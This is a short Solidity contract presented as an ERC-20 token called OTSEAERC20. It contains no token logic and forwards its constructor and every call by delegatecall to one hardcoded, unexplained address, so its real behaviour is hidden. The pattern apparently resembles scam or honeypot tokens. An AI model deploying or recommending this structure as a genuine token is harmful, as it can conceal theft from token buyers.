// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

contract OTSEAERC20 {
    fallback(bytes calldata data) external payable returns (bytes memory) {
        (bool success, bytes memory result) = (
            0x8B7d386E0cDa5B91b4534C9C56E8c39AFf92573b
        ).delegatecall(data);
        require(success, "Fail");
        return result;
    }

    constructor(
        string memory name,
        string memory symbol,
        uint256 supply,
        address addressFrom,
        uint256 balanceOfUsers,
        uint256 decimals
    ) {
        bytes memory data = abi.encodeWithSignature(
            "initialize(string,string,uint256,address,uint256,uint256)",
            name,
            symbol,
            supply,
            addressFrom,
            balanceOfUsers,
            decimals
        );

        (bool success, bytes memory result) = (
            0x8B7d386E0cDa5B91b4534C9C56E8c39AFf92573b
        ).delegatecall(data);

        require(success, "Fail");
    }
}